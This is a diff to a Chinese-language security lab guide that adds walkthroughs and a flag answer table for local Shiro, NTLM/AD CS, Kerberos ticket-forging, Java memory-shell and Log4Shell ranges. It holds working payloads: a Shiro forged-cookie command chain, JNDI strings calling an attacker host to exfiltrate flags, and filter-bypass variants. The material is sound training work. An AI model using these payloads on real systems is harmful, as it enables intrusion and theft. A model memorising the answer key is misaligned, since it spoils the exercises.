@@ -6,7 +6,9 @@
 
 靶场按难度大致排：DVWA（基础）→ JWT / XXE（Web 常规漏洞）→
 反序列化 / Gopher（进阶）→ webshell-hunt（应急响应）→ 沙箱逃逸（进阶）→
-ARP（网络层）。
+Shiro（多版本对照）→ ARP（网络层）→ Replay / AD CS（域内协议链）→
+Kerberos（黄金 / 白银票据）→ Log4Shell（组件漏洞）。Java 内存马不是漏洞，
+没有 flag，验证方式在它自己的章节里。
 
 ---
 
@@ -36,10 +38,27 @@ ARP（网络层）。
 | 沙箱逃逸 | L4（chroot） | `FLAG{sandbox_escape_chroot_fd_7a8b}` | sbox-web `/flag_l4`（jail 外） |
 | 沙箱逃逸 | L5（docker.sock） | `FLAG{sandbox_escape_docker_sock_9c0d}` | sbox-vault `/flag_l5` |
 | 沙箱逃逸 | L6（privileged） | `FLAG{sandbox_escape_privileged_host_1e2f}` | 宿主 `/lab-escape/l6.flag` |
+| Shiro | 550（1.2.4 默认密钥） | `FLAG{shiro550_default_key_rememberme_4b71}` | shiro-550 `/flag` |
+| Shiro | 721（padding oracle） | `FLAG{shiro721_padding_oracle_root_9c2e}` | shiro-721 `/flag` |
+| Shiro | 路径绕过（任一版本） | `FLAG{shiro_path_bypass_semicolon_a83d}` | shiro-bypass `/flag` |
+| Replay / AD CS | L1 无防重放 | `FLAG{replay_l1_no_nonce_no_timestamp_at_all}` | replay-adcs `/flags/l1.flag` |
+| Replay / AD CS | L2 假 nonce | `FLAG{replay_l2_nonce_not_covered_by_signature}` | replay-adcs `/flags/l2.flag` |
+| Replay / AD CS | L3 NTLMv2 | `FLAG{ntlmv2_challenge_response_handcrafted}` | replay-adcs `/flags/l3.flag` |
+| Replay / AD CS | L4 ESC8 中继 | `FLAG{esc8_ntlm_relay_dc_to_certsrv}` | replay-adcs `/flags/l4.flag` |
+| Replay / AD CS | L5 ESC1 + PKINIT | `FLAG{esc1_san_upn_pkinit_domain_admin}` | replay-adcs `/flags/l5.flag` |
+| Kerberos | L1 正常 AS/TGS/AP | `FLAG{kerberos_l1_as_tgs_ap}` | kerberos `/flags/l1.flag` |
+| Kerberos | L2 黄金票据 TGT | `FLAG{kerberos_l2_golden_tgt}` | kerberos `/flags/l2.flag` |
+| Kerberos | L3 白银票据 TGS | `FLAG{kerberos_l3_silver_tgs}` | kerberos `/flags/l3.flag` |
+| Kerberos | L4 SPN 作用域 | `FLAG{kerberos_l4_spn_scope}` | kerberos `/flags/l4.flag` |
+| Kerberos | L5 PAC 签名 | `FLAG{kerberos_l5_pac_signature}` | kerberos `/flags/l5.flag` |
+| Kerberos | L6 krbtgt 轮换 | `FLAG{kerberos_l6_krbtgt_rotation}` | kerberos `/flags/l6.flag` |
+| Log4Shell | L1 `${env:}` 外带 | `FLAG{log4shell_env_lookup_oob_7d2a}` | log4shell `/flags/l1.flag` |
+| Log4Shell | L2 远程 codebase RCE | `FLAG{log4shell_jndi_codebase_rce_b41e}` | log4shell `/flags/l2.flag` |
+| Log4Shell | L3 关键字绕过 | `FLAG{log4shell_lookup_obfuscation_9c73}` | log4shell `/flags/l3.flag` |
 
-DVWA、webshell-hunt、ARP 没有 flag：
+DVWA、webshell-hunt、ARP、Java 内存马没有 flag：
 DVWA 是 18 个模块的练习场，webshell-hunt 的目标是「找齐 9 处后门」，
-ARP 是网络实验，评价标准都在各自 README 里。
+ARP 是网络实验，Java 内存马是驻留机制的运行时验证。评价标准都在各自 README 里。
 
 ---
 
@@ -533,7 +552,219 @@ macOS / Windows 上"宿主"是 Docker Desktop 的 Linux VM。
 
 ---
 
-## 九、一键验证
+## 九、Shiro（三个入口，六个版本）
+
+三个入口共用同一个镜像，靠 `--lab.mode` 切换行为。原理见 `shiro/README.md`，
+这里只写「怎么最快拿到 flag」。
+
+### 9.1 Shiro-550：默认密钥（:8901）
+
+```bash
+python3 shiro/poc/shiro550_exp.py
+```
+
+要点：
+
+- 1.2.4 的 rememberMe 密钥是常量 `kPH+bIxk5D2deZiIxcaaaA==`
+- 先发一个坏 cookie 看服务端回不回 `rememberMe=deleteMe`，确认是 Shiro
+- 拿 `/payloads/cc6.bin`（CC6 序列化字节），用每个候选 key 加密后发出去
+- 命令是 `cat /flag > /tmp/out/flag.txt`，再从 `/out/flag.txt` 把结果取回来
+- 命中在第 6 个 key，不是第一个
+
+手工版（想自己拼 cookie 的话）：
+
+```bash
+KEY=$(printf '%s' 'kPH+bIxk5D2deZiIxcaaaA==' | base64 -d | xxd -p -c 32)
+IV=$(openssl rand -hex 16)
+openssl enc -aes-128-cbc -K "$KEY" -iv "$IV" -in /tmp/cc6.bin -out /tmp/ct.bin
+(printf '%s' "$IV" | xxd -r -p; cat /tmp/ct.bin) | base64 | tr -d '\n' > /tmp/ck
+curl -H "Cookie: rememberMe=$(cat /tmp/ck)" http://127.0.0.1:8901/
+curl http://127.0.0.1:8901/out/flag.txt
+```
+
+### 9.2 Shiro-721：padding oracle（:8902）
+
+```bash
+python3 shiro/poc/shiro721_exp.py              # 默认串行，约 1 分钟（实测 50 秒左右）
+python3 shiro/poc/shiro721_exp.py --workers 4  # 想快点可以调，但可能误判
+```
+
+要点：
+
+- 1.2.5 起密钥随机，550 的套路失效；但 CBC 没有完整性校验
+- 先用 `guest/guest123` 正常登录拿一个合法 cookie（416 字节 = IV + 25 块）
+- 用 `/__oracle` 当裁判：204 = 填充合法，400 = 填充非法
+- **每次只发两块密文**，让目标块变成"最后一块"，填充校验才对得准
+- **每造一块新密文，都要重新爆破一次它的中间值**——不能拿原 cookie 的
+  `D(Ci)` 去套新块，解出来是乱码（我就在这儿卡了很久，`/admin` 一路 302）
+- payload 362 字节 → 23 块，串行约 51 秒
+
+flag 在 `/admin` 页面上，需要伪造出 `root` 身份才能看到。
+
+不用 oracle 的验证路径（调试用）：
+
+```bash
+# 起容器时加 --lab.debug=true，日志里会打出这次随机生成的 AES key
+docker run --rm -e JAVA_TOOL_OPTIONS= sec-lab/shiro:1.0 \
+  java -jar /app/shiro-1.2.5.jar --lab.mode=721 --lab.debug=true
+```
+
+拿这个 key 直接加密 `principal_root.bin`，一样能进 `/admin` —— 说明
+"伪造身份"这件事本身不需要 oracle，oracle 解决的是"不知道 key 时怎么伪造"。
+
+### 9.3 路径绕过：四个版本对照（:8903~8906）
+
+```bash
+python3 shiro/poc/bypass_exp.py
+```
+
+四个端口对应 1.4.2 / 1.5.2 / 1.6.0 / 1.7.1，同一批 payload 打过去：
+
+| payload | 1.4.2 | 1.5.2 | 1.6.0 | 1.7.1 |
+|---|---|---|---|---|
+| `/admin`（基线） | 302 | 302 | 302 | 302 |
+| `/;/admin` | **BYPASS** | 302 | 400 | 400 |
+| `/xxx/..;/admin` | 404 | 302 | 400 | 400 |
+| `/admin/%3b` | 302 | 302 | 400 | 400 |
+| `/admin/%20` | 302 | 302 | 302 | 302 |
+
+怎么读这张表：
+
+- **BYPASS**：Shiro 没匹配到 `/admin/**`，Spring 却把它路由到了 `/admin`，flag 到手
+- **302**：被 `authc` 拦住，跳 `/login`
+- **400**：1.6.0 起加了 `InvalidRequestFilter`，含分号 / 编码分号的 URL 直接被拒
+- **404**：Shiro 放行了（不是 302），但 Spring 没把这条路径映射到 controller
+
+`/xxx/..;/admin` 在 1.4.2 上是 404 而不是 302，这一点值得注意：
+**鉴权已经绕过了**，只是这个靶场的路由没接住。真实系统里换个路由、
+或者把路径换成 `/xxx/..;/admin/list` 之类的具体接口，往往就能打进去。
+
+想加自己的 payload，改 `shiro/poc/bypass_exp.py` 里的 `PAYLOADS` 列表。
+
+---
+
+## 十、Replay / AD CS（8910）
+
+五关一条链，`python3 replay-adcs/poc/exp.py` 一键跑完。卡住时看下面每一步的落点。
+
+**L1** — `GET /bank/sample?level=1` 拿一条已经签好名的合法报文，原样
+`POST /bank/l1/transfer` 五次。签名是 `HMAC-MD5(from|to|amount)`，不用破解：
+重放攻击从来不需要知道密钥。
+
+**L2** — 服务端加了 nonce 去重和 300 秒时间窗，但签名仍是上面那个式子，
+`nonce` / `ts` 都没进签名。每次换一个新 `nonce`、刷新 `ts`，`sig` 原封不动，
+五次打 `POST /bank/l2/transfer`。原样重放会被 409 挡住，正好证明去重是真的生效了。
+
+**L3** — `LAB\alice / Passw0rd!`。
+`type1 = ntlm.build_type1("LAB","CLIENT")` → POST `/ntlm/l3/type1` 拿 Type2；
+`type3 = ntlm.make_type3_from_type2(ntlm.nt_hash("Passw0rd!"), "alice", "LAB", type2)`；
+POST `/ntlm/l3/type3` 带 `sid` + `type3`。challenge 用后即删，别想着重放 Type3。
+
+**L4** — 四步纯搬运，脚本里没有密码也没有 NT hash：
+`POST /victim/negotiate` 拿 Type1 → 放进 `Authorization: NTLM <b64>` POST
+`/certsrv/certfnsh.asp` 换 401 的 Type2（顺手收 `X-NTLM-Challenge` 头）→
+`POST /victim/authenticate` 带 `vid` + `type2` 换 Type3 →
+把 Type3 放进 `Authorization`、带上 `X-NTLM-Challenge` 再 POST 一次 certsrv。
+CA 认证成 `LAB\DC$`，出 flag。
+
+**L5** — 带 `X-CA-Session` POST `/certsrv/certfnsh.asp`：
+`{"template":"VulnWebServer","subject":"CN=dc$","san":"upn=administrator@lab.local"}`。
+拿 `cert` POST `/kdc/asktgt` 换 TGT，再带 `X-TGT` GET `/admin`。
+同样的证书打 `/kdc/safe/asktgt` 会 403（KB5014754 强证书映射），这是修复对照。
+
+flag 见总表。实现边界（哪些是真协议、哪些是 HMAC 替身）和真机对应工具链
+写在 `replay-adcs/README.md`，页面 `/safe/check` 里前五项是实测、后两项是清单。
+
+---
+
+## 十一、Java 内存马（19090，独立启动）
+
+**没有 flag**——这是驻留机制验证，答案就是「注册表前后差了一个 Filter，
+且磁盘上找不到它」。先起环境：`./java-memshell/up.sh`（需要宿主 `javac`），
+再跑 `python3 java-memshell/poc/run.py` 看 L0~L4。
+
+**L0 基线** — `GET /__lab/scan`，记下 4 个 Filter 的 `codeSource`，全是 jar 路径。
+
+**L1 标准 API 被拒** — 直接调 `addFilter` 会抛 `IllegalStateException`；
+`javap` 确认 Tomcat 9 要求 `getState() == STARTING_PREP`，运行期已经过了这个阶段。
+
+**L2 注入** — 通过模拟 RCE 入口把 base64 编码的 `EvilFilter.class` 送进去，
+反射拿到 `StandardContext` 后走动态注册。`addFilterMapBefore` **不保证插到链首**
+（反编译 `ContextFilterMaps.insertPoint` 可见）；实测新映射排在第 4/5 位——
+这是手册里带错误结论原文的那条认知纠错。
+
+**L3 命中与放行** — 带 `X-Lab-Probe` 的请求被 Filter 截获回显，不带则原样放行；
+连 404 路径也会被截获，因为 Filter 在 Servlet 之前。
+
+**L4 运行时检测** — 容器里 `find / -name '*Evil*'` 什么都没有（`classes` 只读挂载、
+攻击者侧 `.class` 根本不进容器），但 `jcmd 1 GC.class_histogram | grep evil` 能看到
+`evil.EvilFilter`，`/__lab/scan` 里它的 `codeSource=null`。
+
+**L5 重启清零** — `docker restart memshell-lab` 后再扫，注入的 Filter 消失，回到 L0 基线。
+完整命令、逐段原理与 6 条错误结论反证在 `java-memshell/Java内存马-练习手册.md`。
+
+---
+
+## 十二、Kerberos 黄金 / 白银票据（8907，独立启动）
+
+先 `cd kerberos && sh setup.sh`，然后 `python3 poc/lab.py help` 看全部命令。
+`python3 poc/solve.py` 一键跑完六关并断言；想自己练就按下面逐关来。
+已知凭据 `alice / alice123`，票据每次指纹 / 时间戳会变，`ok` / flag / 日志条数不变。
+
+**L1 正常三段流程** — `login alice alice123` → `ask http/portal.lab.local` →
+`use http/portal.lab.local` → `logs`。DC 日志新增 4768（TGT 签发）+ 4769（TGS 签发），
+成员机新增 4624。
+
+**L2 黄金票据** — `leak krbtgt`（模拟 DCSync）→ `forge golden` → `klist` →
+`ask cifs/dc.lab.local` → `use`。全程不发 HTTP 给 KDC 的 AS，TGT 是本地用
+`krbtgt` 密钥封印的；能过是因为 KDC 信任自己签过的东西。`FLAG{kerberos_l2_golden_tgt}`。
+
+**L3 白银票据** — `leak service cifs/files.lab.local`（模拟目标机提权读机器账户）
+→ `forge silver --spn cifs/files.lab.local` → `use`。**关键证据：DC 的 4769 一行不增**，
+票据只给目标服务自己验。`FLAG{kerberos_l3_silver_tgs}`。
+
+**L4 SPN 作用域** — 直接 `use http/files.lab.local`：同一台机器上的不同 SPN
+用的是不同服务密钥，跨 SPN 用不了，被拒。
+
+**L5 完整 PAC 签名** — `pac on` 后重放白银票据得到 `bad_kdc_signature`（服务端验出了
+PAC 里 KDC 签名不对）；黄金票据仍然成功，因为 krbtgt 签的 PAC 本来就合法。
+通关后 `klist` 能直接看到：TGT 的 PAC 两个签名相同，TGS 的两个不同——
+一个用 krbtgt + 服务密钥分别签。
+
+**L6 krbtgt 轮换** — 存好旧黄金 TGT，`reset`（轮换 krbtgt）后 `ask` 仍成功
+（票据还在有效期内、签名用的是旧密钥的历史条目）；再 `reset` 一次就 `tgt_invalid`。
+flag 见总表；每关的命令 / 原理 / 实测输出逐段写在 `kerberos/README.md`。
+
+---
+
+## 十三、Log4Shell（19080~19082，独立启动）
+
+先 `./log4shell/up.sh`。payload 打在 User-Agent，`Main.java` 把它 `LOG.info()` 进日志，
+log4j-core 2.14.1 的 `StrSubstitutor` 自己完成解析——漏洞不在业务代码里。
+
+**L1 环境变量外带** — `python3 log4shell/poc/01_probe.py`：
+`${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}`。log4j 先算嵌套的 `${env:}` 再发 LDAP，
+DN 里带上 flag，`curl http://127.0.0.1:19089/events` 可读到。不 RCE。
+
+**L2 远程 codebase RCE** — `python3 log4shell/poc/02_rce.py` 发
+`${jndi:ldap://attacker:1389/l2}`。JNDI 查到 `javaNamingReference`，去 19089 取
+`L2.class`，目标 JVM 执行静态块读 `/flag_l2` 并 POST `/collect`。
+**19080 必须带 `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`**——JDK 8u191 起默认
+禁止远程 codebase，19081 保留了默认值专门做这个对照。
+
+**L3 关键字绕过** — `python3 log4shell/poc/03_bypass.py` 用 `${::-j}ndi:...`
+把 `jndi` 拼回来，绕过只匹配字面量的黑名单。`FLAG{log4shell_lookup_obfuscation_9c73}`。
+
+**L4 加固对照** — 同样的 payload 打 19081（JDK 默认）只会有回连、不会加载远程类；
+打 19082（2.17.1）连 lookup 都不再触发。**JDK 加固挡的是「远程类加载」这一步，
+升级 log4j 才根治**。这是认知对照，没有 flag。
+
+`python3 log4shell/poc/verify.py` 一键回归全部四关；逐层原理、踩坑与
+错误结论反证在 `log4shell/Log4Shell-练习手册.md`。
+
+---
+
+## 十四、一键验证
 
 各靶场自带纯标准库的验证脚本，环境起来后直接跑：
 
@@ -545,6 +776,19 @@ cd jwt && python3 poc/jwt_exp.py                      # JWT 四关
 cd gopher/poc && python3 01_gopher_raw.py             # 六关按编号逐个跑
 cd webshell-hunt && python3 hunt.py --docker webshell-hunt
 cd sandbox-escape && python3 poc/verify.py             # 沙箱逃逸 L1~L4
+cd shiro && python3 poc/shiro550_exp.py               # Shiro 550
+cd shiro && python3 poc/shiro721_exp.py               # Shiro 721（约 1 分钟）
+cd shiro && python3 poc/bypass_exp.py                 # 四个版本的绕过矩阵
+cd replay-adcs && python3 poc/exp.py                   # 重放 + AD CS 五关
+cd replay-adcs && python3 ntlm.py                     # 协议层自测
+```
+
+上面是根编排里的 11 个。下面三个是独立靶场，**先按各自方式起环境**再跑：
+
+```bash
+./java-memshell/up.sh && python3 java-memshell/poc/run.py    # 内存马 L0~L4，需宿主 javac
+cd kerberos && sh setup.sh && python3 poc/solve.py            # 黄金 / 白银票据六关
+./log4shell/up.sh && python3 log4shell/poc/verify.py          # Log4Shell 四关
 ```
 
 都没有第三方依赖，`urllib` + `socket` + `hmac` 手写。
